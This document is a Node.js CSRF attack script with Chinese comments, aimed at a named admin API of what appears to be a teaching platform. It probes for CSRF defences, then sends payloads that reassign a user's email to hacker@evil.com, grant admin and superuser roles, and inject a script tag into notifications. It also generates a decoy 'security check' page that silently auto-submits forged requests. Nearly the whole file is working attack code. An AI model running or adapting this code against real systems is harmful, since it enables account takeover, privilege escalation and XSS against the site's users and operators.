// csrf-attack.js
const https = require('https');
const axios = require('axios');

class CSRFAttacker {
    constructor(baseUrl, apiUrl) {
        this.baseUrl = baseUrl;
        this.apiUrl = apiUrl;
        this.axiosInstance = axios.create({
            httpsAgent: new https.Agent({  
                rejectUnauthorized: false
            }),
            withCredentials: true, // 携带cookie
            timeout: 10000
        });
    }

    // 检测CSRF保护
    async detectCSRFProtection() {
        console.log('=== 检测CSRF保护 ===');
        
        try {
            // 检查API端点
            const response = await this.axiosInstance.get(this.apiUrl, {
                validateStatus: () => true
            });
            
            const headers = response.headers;
            console.log('响应头:', {
                'X-CSRF-Token': headers['x-csrf-token'],
                'Set-Cookie': headers['set-cookie'] ? '有Cookie设置' : '无Cookie设置'
            });

            // 检查是否需要特定头
            const testRequests = [
                { method: 'POST', headers: {} },
                { method: 'POST', headers: { 'X-Requested-With': 'XMLHttpRequest' } },
                { method: 'POST', headers: { 'Content-Type': 'application/json' } }
            ];

            for (const test of testRequests) {
                try {
                    const testResponse = await this.axiosInstance.post(this.apiUrl, 
                        { test: 'data' }, 
                        { 
                            headers: test.headers,
                            validateStatus: () => true 
                        }
                    );
                    
                    console.log(`方法: ${test.method}, 头: ${JSON.stringify(test.headers)}`);
                    console.log(`状态: ${testResponse.status}`);
                    
                } catch (error) {
                    console.log(`测试失败: ${error.message}`);
                }
            }
            
        } catch (error) {
            console.log('检测失败:', error.message);
        }
    }

    // 发起CSRF攻击
    async launchCSRFAttack() {
        console.log('\n=== 发起CSRF攻击 ===');
        
        const attackPayloads = [
            {
                name: '修改用户信息',
                data: {
                    email: 'hacker@evil.com',
                    phone: '13800138000',
                    role: 'admin'
                }
            },
            {
                name: '创建恶意通知',
                data: {
                    title: '<script>alert("XSS")</script>',
                    content: '恶意内容',
                    type: 'urgent'
                }
            },
            {
                name: '权限提升',
                data: {
                    userId: 1,
                    permissions: ['admin', 'superuser'],
                    status: 'active'
                }
            }
        ];

        for (const attack of attackPayloads) {
            console.log(`\n尝试CSRF攻击: ${attack.name}`);
            
            try {
                // 尝试表单提交
                const formResponse = await this.axiosInstance.post(this.apiUrl, 
                    attack.data,
                    {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        validateStatus: () => true
                    }
                );
                
                console.log(`表单攻击状态: ${formResponse.status}`);
                
                // 尝试JSON提交
                const jsonResponse = await this.axiosInstance.post(this.apiUrl,
                    attack.data,
                    {
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        validateStatus: () => true
                    }
                );
                
                console.log(`JSON攻击状态: ${jsonResponse.status}`);
                
                if (formResponse.status === 200 || jsonResponse.status === 200) {
                    console.log(`🚨 可能的CSRF漏洞: ${attack.name}`);
                }
                
            } catch (error) {
                console.log(`攻击失败: ${error.message}`);
            }
            
            await this.delay(2000);
        }
    }

    // 创建恶意HTML页面
    generateMaliciousHTML() {
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <title>安全检测页面</title>
</head>
<body>
    <h1>欢迎使用教学平台</h1>
    <p>请等待系统检测...</p>
    
    <iframe id="hiddenFrame" style="display:none"></iframe>
    
    <script>
        // 自动提交CSRF表单
        function launchCSRF() {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '${this.apiUrl}';
            form.style.display = 'none';
            
            const fields = {
                'title': 'CSRF攻击测试',
                'content': '这是一个CSRF攻击演示',
                'type': 'malicious'
            };
            
            for (const [key, value] of Object.entries(fields)) {
                const input = document.createElement('input');
                input.name = key;
                input.value = value;
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            form.submit();
            console.log('CSRF攻击已发起');
        }
        
        // 延迟执行攻击
        setTimeout(launchCSRF, 3000);
        
        // 尝试JSON CSRF
        setTimeout(() => {
            fetch('${this.apiUrl}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    malicious: true,
                    data: 'JSON CSRF攻击'
                })
            }).then(response => {
                console.log('JSON CSRF响应:', response.status);
            });
        }, 5000);
    </script>
</body>
</html>
        `;
        
        // 保存为HTML文件
        const fs = require('fs');
        fs.writeFileSync('csrf-attack.html', htmlContent);
        console.log('恶意HTML页面已生成: csrf-attack.html');
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // 执行所有CSRF攻击
    async launchAllCSRFAttacks() {
        console.log('开始CSRF攻击测试...\n');
        
        await this.detectCSRFProtection();
        await this.launchCSRFAttack();
        this.generateMaliciousHTML();
        
        console.log('\nCSRF攻击测试完成');
    }
}

// 执行CSRF攻击
const csrfAttacker = new CSRFAttacker(
    'https://test.xuandou.vip:107/',
    'https://test.xuandou.vip:48082/admin-api/teacher/home/message-notification-details-by-teacher'
);

csrfAttacker.launchAllCSRFAttacks();